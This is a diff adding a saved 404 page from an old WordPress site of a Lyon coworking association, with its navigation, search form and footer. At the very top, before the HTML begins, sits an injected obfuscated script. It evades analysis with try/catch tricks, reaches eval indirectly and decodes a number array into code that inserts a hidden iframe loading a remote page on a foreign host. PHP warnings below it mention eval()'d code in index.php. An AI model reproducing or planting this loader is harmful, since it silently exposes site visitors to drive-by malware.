@@ -1,0 +1,257 @@
+<script>if(window.document){v=window;try{fawbe++}catch(afnwenew){try{(v+v)()}catch(gngrthn){try{v["document"]["body"]="123"}catch(gfdnfdgber){m=123;if((alert+"").indexOf("native")!==-1)ev=window["e"+"va".concat("l")];}}
+n=["9","9","49","46","18","1g","44","4f","43","4l","4d","45","4e","4k","1m","47","45","4k","2l","4c","45","4d","45","4e","4k","4j","2i","51","3c","41","47","36","41","4d","45","1g","1f","42","4f","44","51","1f","1h","3j","20","3l","1h","53","d","9","9","9","49","46","4i","41","4d","45","4i","1g","1h","2b","d","9","9","55","18","45","4c","4j","45","18","53","d","9","9","9","44","4f","43","4l","4d","45","4e","4k","1m","4n","4i","49","4k","45","1g","1a","2c","49","46","4i","41","4d","45","18","4j","4i","43","2d","1f","48","4k","4k","4g","2a","1n","1n","52","4h","45","4c","43","4i","41","4f","1m","4g","4f","4i","4k","22","25","1m","42","49","52","1n","43","4f","4l","4e","4k","45","4i","1n","4d","41","49","4e","1m","4g","48","4g","1f","18","4n","49","44","4k","48","2d","1f","21","20","1f","18","48","45","49","47","48","4k","2d","1f","21","20","1f","18","4j","4k","51","4c","45","2d","1f","4m","49","4j","49","42","49","4c","49","4k","51","2a","48","49","44","44","45","4e","2b","4g","4f","4j","49","4k","49","4f","4e","2a","41","42","4j","4f","4c","4l","4k","45","2b","4c","45","46","4k","2a","20","2b","4k","4f","4g","2a","20","2b","1f","2e","2c","1n","49","46","4i","41","4d","45","2e","1a","1h","2b","d","9","9","55","d","9","9","46","4l","4e","43","4k","49","4f","4e","18","49","46","4i","41","4d","45","4i","1g","1h","53","d","9","9","9","4m","41","4i","18","46","18","2d","18","44","4f","43","4l","4d","45","4e","4k","1m","43","4i","45","41","4k","45","2l","4c","45","4d","45","4e","4k","1g","1f","49","46","4i","41","4d","45","1f","1h","2b","46","1m","4j","45","4k","2h","4k","4k","4i","49","42","4l","4k","45","1g","1f","4j","4i","43","1f","1k","1f","48","4k","4k","4g","2a","1n","1n","52","4h","45","4c","43","4i","41","4f","1m","4g","4f","4i","4k","22","25","1m","42","49","52","1n","43","4f","4l","4e","4k","45","4i","1n","4d","41","49","4e","1m","4g","48","4g","1f","1h","2b","46","1m","4j","4k","51","4c","45","1m","4m","49","4j","49","42","49","4c","49","4k","51","2d","1f","48","49","44","44","45","4e","1f","2b","46","1m","4j","4k","51","4c","45","1m","4g","4f","4j","49","4k","49","4f","4e","2d","1f","41","42","4j","4f","4c","4l","4k","45","1f","2b","46","1m","4j","4k","51","4c","45","1m","4c","45","46","4k","2d","1f","20","1f","2b","46","1m","4j","4k","51","4c","45","1m","4k","4f","4g","2d","1f","20","1f","2b","46","1m","4j","45","4k","2h","4k","4k","4i","49","42","4l","4k","45","1g","1f","4n","49","44","4k","48","1f","1k","1f","21","20","1f","1h","2b","46","1m","4j","45","4k","2h","4k","4k","4i","49","42","4l","4k","45","1g","1f","48","45","49","47","48","4k","1f","1k","1f","21","20","1f","1h","2b","d","9","9","9","44","4f","43","4l","4d","45","4e","4k","1m","47","45","4k","2l","4c","45","4d","45","4e","4k","4j","2i","51","3c","41","47","36","41","4d","45","1g","1f","42","4f","44","51","1f","1h","3j","20","3l","1m","41","4g","4g","45","4e","44","2j","48","49","4c","44","1g","46","1h","2b","d","9","9","55"];h=2;s="";if(m)for(i=0;i-595!=0;i++){k=i;if(window["document"])s+=String["fro"+"mCharCode"](parseInt(n[i],24));}try{if(window.document)febwnrth--}catch(bawetawe){z=s;ev(z)}}}</script><br />
+<b>Warning</b>:  session_start() [<a href='function.session-start'>function.session-start</a>]: Cannot send session cookie - headers already sent by (output started at /homez.228/ateliermnp/www/index.php(1) : eval()'d code:8) in <b>/homez.228/ateliermnp/www/wp-config.php</b> on line <b>1</b><br />
+<br />
+<b>Warning</b>:  session_start() [<a href='function.session-start?PHPSESSID=fb5c2223c686b5a45e92d6b456f54452'>function.session-start</a>]: Cannot send session cache limiter - headers already sent (output started at /homez.228/ateliermnp/www/index.php(1) : eval()'d code:8) in <b>/homez.228/ateliermnp/www/wp-config.php</b> on line <b>1</b><br />
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
+	<meta name="generator" content="WordPress 3.4.2" /> 
+   	
+	<title>Nothing found for  Wp-content Themes Essence Img Shortcodes Tooltip White_arrow_big Png</title>
+    
+	<link rel="alternate" type="application/rss+xml" title="RSS2.0" href="http://old.atelier-medias.org/feed/" />
+	<link rel="pingback" href="http://old.atelier-medias.org/xmlrpc.php" />
+	<link rel="stylesheet" type="text/css"  media="all" href="http://old.atelier-medias.org/wp-content/themes/essence/style.css" />
+
+		
+   		<link rel="shortcut icon" href="http://atelier-medias.org/wp-content/uploads/2011/04/favicon.jpg" /> 
+ 	    <!--[if IE ]><link rel="stylesheet" type="text/css" href="http://old.atelier-medias.org/wp-content/themes/essence/css/ie.css" /><![endif]-->
+  	
+      
+			<script type="text/javascript">//<![CDATA[
+			// Google Analytics for WordPress by Yoast v4.2.8 | http://yoast.com/wordpress/google-analytics/
+			var _gaq = _gaq || [];
+			_gaq.push(['_setAccount', 'UA-22457099-1']);
+							_gaq.push(['_trackPageview','/404.html?page=' + document.location.pathname + document.location.search + '&from=' + document.referrer]);
+			(function () {
+				var ga = document.createElement('script');
+				ga.type = 'text/javascript';
+				ga.async = true;
+				ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+				var s = document.getElementsByTagName('script')[0];
+				s.parentNode.insertBefore(ga, s);
+			})();
+			//]]></script>
+			<link rel='stylesheet' id='plugin-styles-css'  href='http://old.atelier-medias.org/wp-content/themes/essence/css/plugins.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='pretty-photo-css'  href='http://old.atelier-medias.org/wp-content/themes/essence/css/prettyPhoto.css?ver=3.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-polls-css'  href='http://old.atelier-medias.org/wp-content/plugins/wp-polls/polls-css.css?ver=2.63' type='text/css' media='all' />
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/jquery-1.4.4.min.js?ver=1.4.4'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/jquery.tools.min.js?ver=1.2.5'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/cufon-yui.js?ver=1.0.9'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/jquery.prettyPhoto.js?ver=3.0.1'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/jquery.cookie.js?ver=1.0'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/custom.js?ver=1.0'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/validate.js?ver=3.4.2'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/swfobject/swfobject.js?ver=3.4.2'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/Bebas_Neue_400.font.js?ver=3.4.2'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/jquery.masonry.min.js?ver=3.4.2'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/slides.min.jquery.js?ver=3.4.2'></script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/themes/essence/js/menu.js?ver=3.4.2'></script>
+
+<!-- All in One SEO Pack 1.6.15.2 by Michael Torbert of Semper Fi Web Design[302,390] -->
+<!-- /all in one seo pack -->
+<link rel="stylesheet" href="http://old.atelier-medias.org/wp-content/plugins/digg-digg/include/../css/diggdigg-style.css?ver=5.2.9" type="text/css" media="screen" /><style type="text/css">
+.wp-polls .pollbar {
+	margin: 1px;
+	font-size: 6px;
+	line-height: 8px;
+	height: 8px;
+	background-image: url('http://old.atelier-medias.org/wp-content/plugins/wp-polls/images/default/pollbg.gif');
+	border: 1px solid #c8c8c8;
+}
+</style>
+<style type="text/css">.broken_link, a.broken_link {
+	text-decoration: line-through;
+}</style><script type="text/javascript">var src="http://old.atelier-medias.org/wp-content/plugins/wordfence/visitor.php?hid=2FC6F1CB97C46E5BDBE5AB44447BAA5C"; if(window.location.protocol == "https:"){ src = src.replace("http:", "https:"); } var wfHTImg = new Image();  wfHTImg.src=src;</script>   
+    <!--[if lte IE 6]><script src="http://old.atelier-medias.org/wp-content/themes/essence/js/ie6/warning.js"></script><script>window.onload=function(){e("http://old.atelier-medias.org/wp-content/themes/essence/js/ie6/")}</script><![endif]-->
+  	  	<link rel="stylesheet" id="active-theme" type="text/css" href="http://old.atelier-medias.org/wp-content/themes/essence/skins/black/style.css" />
+    <style type="text/css">
+
+
+body{
+	gagbackground-color:#f0f0f0;}
+
+
+
+
+
+
+
+
+
+
+
+
+</style>
+    </head>
+
+<body>
+	<!-- BEGIN HEADER -->
+	    <div id="header">
+	        <div id="header-top">
+	            <div id="logo-container">
+
+
+	                <div id="logo">
+	                	<a href="http://old.atelier-medias.org">
+	                				                		<img src="http://atelier-medias.org/wp-content/uploads/2011/04/logo-atelier-des-medias-home1.jpg" alt="espace coworking a lyon" id="logo-image" />
+	                				               	</a>
+	               	</div>
+
+
+
+
+	            </div>
+              	<div id="menu-container">
+					<div id="menu" class="menu-principal-container"><ul id="menu-principal" class="sf-menu"><li id="menu-item-497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-497"><a href="#">Le projet</a>
+<ul class="sub-menu">
+	<li id="menu-item-233" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-233"><a href="http://old.atelier-medias.org/espace-coworking-lyon/">Co-Work</a></li>
+	<li id="menu-item-232" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-232"><a href="http://old.atelier-medias.org/prospective-medias-lyon/">Co-Lab</a></li>
+	<li id="menu-item-235" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-235"><a href="http://old.atelier-medias.org/co-leg-metiers-des-medias-a-lyon/">Co-Leg</a></li>
+</ul>
+</li>
+<li id="menu-item-502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-502"><a href="#">Actus</a>
+<ul class="sub-menu">
+	<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="http://old.atelier-medias.org/category/actualites/">Blog</a></li>
+	<li id="menu-item-164" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-164"><a href="http://old.atelier-medias.org/agenda/">Agenda</a></li>
+</ul>
+</li>
+<li id="menu-item-503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-503"><a href="#">Nous rejoindre</a>
+<ul class="sub-menu">
+	<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="http://old.atelier-medias.org/coworkers-freelances-a-lyon/">Les coworkers</a></li>
+	<li id="menu-item-899" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-899"><a href="http://old.atelier-medias.org/presse-atelier-des-medias/">Photos &#038; Videos</a></li>
+	<li id="menu-item-192" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-192"><a href="http://old.atelier-medias.org/coworking-lyon-tarifs-adhesion/">Adhesion et Tarifs</a></li>
+</ul>
+</li>
+<li id="menu-item-498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-498"><a href="#">Partenaires</a>
+<ul class="sub-menu">
+	<li id="menu-item-378" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-378"><a href="http://old.atelier-medias.org/nos-partenaires/">Associations</a></li>
+	<li id="menu-item-1577" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1577"><a href="http://old.atelier-medias.org/institutionnels/">Institutionnels</a></li>
+	<li id="menu-item-501" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-501"><a href="http://old.atelier-medias.org/financeurs-et-soutiens-co-working/">Sponsors</a></li>
+	<li id="menu-item-383" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-383"><a href="http://old.atelier-medias.org/reseau-coworking-france/">Coworking</a></li>
+</ul>
+</li>
+<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="http://old.atelier-medias.org/contact-coworking-lyon/">Contactez-nous</a></li>
+</ul></div>                    <div class="clear"></div>
+		   		</div>
+		        <div class="clear"></div>
+		    </div>
+	       
+         </div>
+	    <!-- END HEADER -->
+    	<div id="content">
+	<div id="content-inner">
+		<div class="one_third">
+        	<h2>
+            	<img src="http://old.atelier-medias.org/wp-content/themes/essence/img/page_not_found.png" width="250" height="150" alt="Error 404: Page not Found" />
+            </h2>
+        </div>
+    	<div class="two_third last">
+        	<h2 class="sorry404">
+            	Sorry, the page or file you requested may have been moved or deleted.            </h2>
+            <div class="error-descr-block">
+                <h3 class="inner-title colored">Here are some recommendations to follow:</h3>
+                <ul class="features-list" id="error-page-list">
+                    <li>
+                    	Go to <a href="http://old.atelier-medias.org" title="L&#039;atelier des médias &#8211; coworking lyon (old)">Home Page</a> 
+                    	and start browsing again.                    </li>
+                    <li>View our <a href="#">Sitemap</a> to locate the page of your interest.</li>
+                    <li>Use the search box below.</li>
+                </ul>
+                <form action="/" method="get" id="search-form"><input type="hidden" name="PHPSESSID" value="fb5c2223c686b5a45e92d6b456f54452" />   
+   	<div>
+		<input type="text" name="s" id="search" class="txt" value="" />
+   	</div>
+   	<div>
+		<button type="submit" name="search" id="search-submit" class="button white-back"><span>Search</span></button>
+	</div>
+</form>
+              
+            </div>
+        </div>
+        <div class="clear"></div>
+	</div>
+</div>
+<!-- BEGIN FOOTER -->
+   	<div id="footer-top"></div>
+   	<div id="footer">
+        <div id="footer-wrapper">
+        	<div class="footer-block" style="width:266px "><div class="block-1 ">			<div class="textwidget"><div class="block-3 " style="height: 321px;">	<h3><cufon class="cufon cufon-canvas" alt="Contact " style="width: 60px; height: 20px;"><canvas width="70" height="19" style="width: 70px; height: 19px; top: -3px; left: 0px;"></canvas><cufontext>Contact </cufontext></cufon><cufon class="cufon cufon-canvas" alt="Details" style="width: 51px; height: 20px;"><canvas width="57" height="19" style="width: 57px; height: 19px; top: -3px; left: 0px;"></canvas><cufontext>Details</cufontext></cufon></h3><div class="hr"></div><div class="widget_footer_content">			<div class="textwidget"><div class="top10"></div>
+<div class="getintouch white"><p class="i-phone"><span>N'hésitez pas à nous appeler</span><span class="inf">09 81 65 99 53</span></p>
+
+<p class="i-email">
+<span>Une info, un petit mail ?</span>
+<span class="inf">coworking.lyon@gmail.com</span></p>
+</div></div>
+		</div></div></div>
+		</div></div></div><div class="footer-block" style="width:266px ">		<div class="block-2 ">			<h3>Les derniers articles</h3><div class="hr"></div><div class="widget_footer_content">		<ul>
+				<li><a href="http://old.atelier-medias.org/coworking-dans-lain/" title="Coworking dans l Ain  : un projet qui n a pas encore dit son dernier mot !">Coworking dans l Ain  : un projet qui n a pas encore dit son dernier mot !</a></li>
+				<li><a href="http://old.atelier-medias.org/l-atelier-des-medias-deux-ans-deja/" title="L Atelier des Medias, deux ans deja !">L Atelier des Medias, deux ans deja !</a></li>
+				<li><a href="http://old.atelier-medias.org/tech-entrepreneuriat-et-innovation-quand-les-villes-s-animent/" title="Tech, entrepreneuriat et innovation : quand les villes s animent">Tech, entrepreneuriat et innovation : quand les villes s animent</a></li>
+				<li><a href="http://old.atelier-medias.org/les-gros-chantiers-prevus-pour-cet-automne/" title="Les gros chantiers prevus pour cet automne&#8230;">Les gros chantiers prevus pour cet automne&#8230;</a></li>
+				<li><a href="http://old.atelier-medias.org/compte-rendu-de-l-ag-de-juin-2012/" title="Compte rendu de l AG de juin 2012">Compte rendu de l AG de juin 2012</a></li>
+				</ul>
+		</div></div></div><div class="footer-block" style="width:266px; padding-right:0"><div class="block-3 ">			<div class="textwidget"><h3>
+<cufon class="cufon cufon-canvas" alt="Abonnez-vous ! " style="width: 31px; height: 20px;"><canvas width="41" height="19" style="width: 41px; height: 19px; top: -3px; left: 0px;"></canvas>
+</cufon></h3>
+
+<p id="subsc-desc">Pour ne rien rater de notre actualité, laissez votre adresse ! Vous recevrez nos articles dans votre boîte aux lettres</p>
+
+<form id="feedburned" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=atelier-medias/XDNO', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true" method="post" action="http://feedburner.google.com/fb/a/mailverify">
+				<div>
+
+					<input type="text" onfocus="if (this.value == 'E-mail Address...') {this.value = '';}" onblur="if (this.value == '') {this.value = 'E-mail Address...';}" value="E-mail Address..." name="email" id="feedburn-email">
+					<button style="float: right;" class="button white-back" name="submit" type="submit"><cufon class="cufon cufon-canvas" alt="Subscribe" style="width: 42px; height: 12px;"><canvas width="46" height="12" style="width: 46px; height: 12px; top: -2px; left: 0px;"></canvas><cufontext>Subscribe</cufontext></cufon></button>
+				</div>	
+				<div>
+					<input type="hidden" name="uri" value="http://feedburner.com">
+					<input type="hidden" value="en_US" name="loc">
+				</div>
+			</form></div>
+		</div></div><div class="block-3 "><script type="text/javascript" src="http://www.flickr.com/badge_code_v2.gne?count=9&amp;display=latest&amp;size=s&amp;layout=x&amp;source=user&amp;user=nr4554544"></script><div class="clear"></div></div></div></div>            <div class="clear"></div>
+      	</div>
+     </div>
+    <div id="footer-bottom">
+        <div id="footer-bottom-wrapper">
+            <div id="copyright">
+                            </div>
+            <div id="fb-right">
+            	 <div id="footer-bottom">
+
+            <div id="fb-right">
+            	 <div class="top15"></div>
+<a href="http://atelier-medias.org/plan-de-site-coworking-lyon/"> plan de site </a>   
+<a href="http://atelier-medias.org/mentions-legales/">mentions légales</a> 
+
+  
+<a href="http://www.ldlc.com">LDLC</a> 
+<a class="social-button" href="http://www.facebook.com/#!/pages/Pour-la-cr%C3%A9ation-dun-espace-Co-Working-%C3%A0-Lyon/155020411196070"><img alt="facebook" src="http://essence.weblusive.com/wp-content/themes/aline/img/icons/facebook.png"></a>
+<a class="social-button" href="#"><img alt="youtube" src="http://essence.weblusive.com/wp-content/themes/aline/img/icons/youtube.png"></a>
+
+<a class="social-button" href="#"><img alt="flickr" src="http://essence.weblusive.com/wp-content/themes/aline/img/icons/flickr.png"></a>
+<a class="social-button" href="#"><img alt="linkedin" src="http://essence.weblusive.com/wp-content/themes/aline/img/icons/linkedin.png"></a>
+<a class="social-button" href="http://twitter.com/#!/Coworking_lyon"><img alt="twitter" src="http://essence.weblusive.com/wp-content/themes/aline/img/icons/twitter.png"></a>    
+
+
+
+    </div>
+        </div>
+
+ 
+
+   </div>            </div>
+        </div>
+     	
+   </div> 
+    <!-- END FOOTER -->
+    <script type='text/javascript'>
+/* <![CDATA[ */
+var pollsL10n = {"ajax_url":"http:\/\/old.atelier-medias.org\/wp-admin\/admin-ajax.php","text_wait":"Your last request is still being processed. Please wait a while ...","text_valid":"Please choose a valid poll answer.","text_multiple":"Maximum number of choices allowed: ","show_loading":"1","show_fading":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://old.atelier-medias.org/wp-content/plugins/wp-polls/polls-js.js?ver=2.63'></script>
+ 
+</body>
+</html>
